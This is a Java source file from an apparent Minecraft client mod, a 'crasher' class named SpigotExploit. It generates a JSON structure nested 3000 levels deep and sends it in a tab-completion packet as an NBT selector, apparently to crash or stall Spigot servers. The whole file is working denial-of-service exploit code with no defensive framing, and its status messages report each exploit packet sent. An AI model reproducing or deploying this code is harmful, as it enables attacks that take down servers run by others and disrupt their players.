package me.nullnet.voxelclient.crashers;

import com.mojang.brigadier.context.CommandContext;
import me.nullnet.voxelclient.Helper;
import me.nullnet.voxelclient.utils.ColorUtil;
import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;
import net.minecraft.class_2805;

public class SpigotExploit {
   public static int execute(CommandContext<FabricClientCommandSource> context) {
      long now = System.currentTimeMillis();

      String json;
      try {
         json = Helper.generateJsonObject(3000).toString().replace("\"", "");
      } catch (StackOverflowError var5) {
         var5.printStackTrace();
         ((FabricClientCommandSource)context.getSource()).sendFeedback(ColorUtil.translate("&8[&5&lVoxel&8] &8[&5SpigotExploit&8] &7There was an error while executing exploit."));
         return 1;
      }

      Helper.sendPacket(new class_2805(0, "msg @a[nbt=" + json + "]"));
      ((FabricClientCommandSource)context.getSource()).getPlayer().method_7353(ColorUtil.translate("&8[&5&lVoxel&8] &8[&5SpigotExploit&8] &7Sent &51 &7exploit packet. &8[&6" + (System.currentTimeMillis() - now) + "ms&8]"), false);
      return 1;
   }
}
